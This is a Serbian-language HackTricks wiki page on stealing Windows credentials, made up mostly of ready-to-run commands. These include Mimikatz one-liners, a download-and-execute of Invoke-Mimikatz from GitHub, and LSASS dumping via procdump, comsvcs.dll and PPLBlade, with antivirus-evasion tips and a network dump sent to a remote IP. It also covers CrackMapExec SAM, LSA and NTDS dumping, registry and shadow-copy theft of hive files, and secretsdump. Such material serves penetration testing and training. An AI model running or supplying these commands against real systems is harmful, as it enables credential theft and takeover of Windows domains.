# Krađa Windows kredencijala

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Kredencijali Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Pronađite druge stvari koje Mimikatz može da uradi na** [**ovoj stranici**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Saznajte više o nekim mogućim zaštitama za kredencijale ovde.**](credentials-protections.md) **Ove zaštite mogu sprečiti Mimikatz da izvuče neke kredencijale.**

## Kredencijali sa Meterpreter-om

Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **koji** sam kreirao da **tražim lozinke i hešove** unutar žrtve.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

Kao **Procdump iz** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**je legitimni Microsoft alat**, nije otkriven od strane Defender-a.\
Možete koristiti ovaj alat da **izvršite dump lsass procesa**, **preuzmete dump** i **izvučete** **akreditive lokalno** iz dump-a.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Izvuci akreditive iz dump-a" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Ovaj proces se automatski obavlja pomoću [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Napomena**: Neki **AV** mogu **otkriti** kao **maliciozno** korišćenje **procdump.exe za dump lsass.exe**, to je zato što **otkrivaju** string **"procdump.exe" i "lsass.exe"**. Tako da je **diskretnije** **proći** kao **argument** **PID** lsass.exe do procdump **umesto** imena **lsass.exe.**

### Dumpovanje lsass sa **comsvcs.dll**

DLL pod imenom **comsvcs.dll** koji se nalazi u `C:\Windows\System32` odgovoran je za **dumpovanje procesne memorije** u slučaju pada. Ovaj DLL uključuje **funkciju** pod imenom **`MiniDumpW`**, koja je dizajnirana da se poziva koristeći `rundll32.exe`.\
Nije bitno koristiti prva dva argumenta, ali treći je podeljen na tri komponente. ID procesa koji treba dumpovati čini prvu komponentu, lokacija dump fajla predstavlja drugu, a treća komponenta je strogo reč **full**. Ne postoje alternativne opcije.\
Nakon parsiranja ovih tri komponente, DLL se angažuje u kreiranju dump fajla i prebacivanju memorije specificiranog procesa u ovaj fajl.\
Korišćenje **comsvcs.dll** je izvodljivo za dumpovanje lsass procesa, čime se eliminiše potreba za upload-ovanjem i izvršavanjem procdump-a. Ova metoda je detaljno opisana na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Sledeća komanda se koristi za izvršenje:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Možete automatizovati ovaj proces sa** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumpovanje lsass-a pomoću Task Manager-a**

1. Desni klik na Task Bar i kliknite na Task Manager
2. Kliknite na Više detalja
3. Potražite proces "Local Security Authority Process" na kartici Procesi
4. Desni klik na proces "Local Security Authority Process" i kliknite na "Create dump file".

### Dumpovanje lsass-a pomoću procdump-a

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) je Microsoft-ov potpisani binarni fajl koji je deo [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketa.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) je alat za dumpovanje zaštićenih procesa koji podržava obfusciranje memorijskih dumpova i prenos na udaljene radne stanice bez smeštanja na disk.

**Ključne funkcionalnosti**:

1. Zaobilaženje PPL zaštite
2. Obfusciranje memorijskih dump fajlova kako bi se izbegle mehanizme detekcije zasnovane na potpisima Defender-a
3. Učitavanje memorijskog dump-a sa RAW i SMB metodama učitavanja bez smeštanja na disk (fileless dump)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Ispusti SAM hešove
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA tajne
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Izvuci NTDS.dit iz ciljanog DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Izvuci NTDS.dit istoriju lozinki sa ciljanog DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Prikaži atribut pwdLastSet za svaki NTDS.dit nalog
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Ove datoteke bi trebale da budu **locirane** u _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Ali **ne možete ih jednostavno kopirati na uobičajen način** jer su zaštićene.

### From Registry

Najlakši način da ukradete te datoteke je da dobijete kopiju iz registra:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Preuzmite** te datoteke na vaš Kali računar i **izvucite hešove** koristeći:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Možete izvršiti kopiranje zaštićenih fajlova koristeći ovu uslugu. Potrebno je da budete Administrator.

#### Using vssadmin

vssadmin binarni fajl je dostupan samo u verzijama Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ali isto to možete uraditi iz **Powershell**. Ovo je primer **kako kopirati SAM datoteku** (hard disk koji se koristi je "C:" i čuva se u C:\users\Public) ali možete to koristiti za kopiranje bilo koje zaštićene datoteke:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Na kraju, takođe možete koristiti [**PS skriptu Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) da napravite kopiju SAM, SYSTEM i ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Datoteka **NTDS.dit** je poznata kao srce **Active Directory**, koja sadrži ključne podatke o korisničkim objektima, grupama i njihovim članstvima. Tu se čuvaju **hash-ovi lozinki** za korisnike domena. Ova datoteka je **Extensible Storage Engine (ESE)** baza podataka i nalazi se na **_%SystemRoom%/NTDS/ntds.dit_**.

Unutar ove baze podataka održavaju se tri glavne tabele:

- **Data Table**: Ova tabela je zadužena za čuvanje detalja o objektima kao što su korisnici i grupe.
- **Link Table**: Prati odnose, kao što su članstva u grupama.
- **SD Table**: **Sigurnosni opisi** za svaki objekat se ovde čuvaju, osiguravajući sigurnost i kontrolu pristupa za pohranjene objekte.

Više informacija o ovome: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows koristi _Ntdsa.dll_ za interakciju sa tom datotekom i koristi ga _lsass.exe_. Tada, **deo** datoteke **NTDS.dit** može biti lociran **unutar `lsass`** memorije (možete pronaći poslednje pristupane podatke verovatno zbog poboljšanja performansi korišćenjem **cache**).

#### Dešifrovanje hash-ova unutar NTDS.dit

Hash je šifrovan 3 puta:

1. Dešifrujte Ključ za šifrovanje lozinke (**PEK**) koristeći **BOOTKEY** i **RC4**.
2. Dešifrujte **hash** koristeći **PEK** i **RC4**.
3. Dešifrujte **hash** koristeći **DES**.

**PEK** ima **istu vrednost** u **svakom kontroleru domena**, ali je **šifrovan** unutar datoteke **NTDS.dit** koristeći **BOOTKEY** datoteke **SYSTEM kontrolera domena (različit između kontrolera domena)**. Zato da biste dobili kredencijale iz datoteke NTDS.dit **potrebni su vam datoteke NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Kopiranje NTDS.dit koristeći Ntdsutil

Dostupno od Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Možete takođe koristiti trik sa [**volume shadow copy**](./#stealing-sam-and-system) da kopirate **ntds.dit** datoteku. Zapamtite da će vam takođe biti potrebna kopija **SYSTEM datoteke** (ponovo, [**izvucite je iz registra ili koristite trik sa volume shadow copy**](./#stealing-sam-and-system)).

### **Ekstrakcija hash-ova iz NTDS.dit**

Kada dobijete datoteke **NTDS.dit** i **SYSTEM**, možete koristiti alate kao što je _secretsdump.py_ da **izvučete hash-ove**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Možete takođe **automatski izvući** koristeći važećeg korisnika sa administratorskim pravima na domeni:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Za **velike NTDS.dit datoteke** preporučuje se da ih izvučete koristeći [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Na kraju, možete koristiti i **metasploit modul**: _post/windows/gather/credentials/domain\_hashdump_ ili **mimikatz** `lsadump::lsa /inject`

### **Izvlačenje domena objekata iz NTDS.dit u SQLite bazu podataka**

NTDS objekti mogu biti izvučeni u SQLite bazu podataka pomoću [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Ne samo da se izvlače tajne, već i ceo objekti i njihova svojstva za dalju ekstrakciju informacija kada je sirova NTDS.dit datoteka već preuzeta.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive is optional but allow for secrets decryption (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Along with other information, the following data is extracted : user and machine accounts with their hashes, UAC flags, timestamp for last logon and password change, accounts description, names, UPN, SPN, groups and recursive memberships, organizational units tree and membership, trusted domains with trusts type, direction and attributes...

## Lazagne

Preuzmite binarni fajl [ovde](https://github.com/AlessandroZ/LaZagne/releases). možete koristiti ovaj binarni fajl za ekstrakciju kredencijala iz nekoliko softvera.
```
lazagne.exe all
```
## Ostali alati za ekstrakciju kredencijala iz SAM i LSASS

### Windows credentials Editor (WCE)

Ovaj alat se može koristiti za ekstrakciju kredencijala iz memorije. Preuzmite ga sa: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Ekstraktujte kredencijale iz SAM fajla
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Izvuci akreditive iz SAM datoteke
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Preuzmite ga sa: [ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) i jednostavno **izvršite ga** i lozinke će biti ekstraktovane.

## Odbrane

[**Saznajte više o zaštiti kredencijala ovde.**](credentials-protections.md)

{% hint style="success" %}
Saznajte i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Saznajte i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
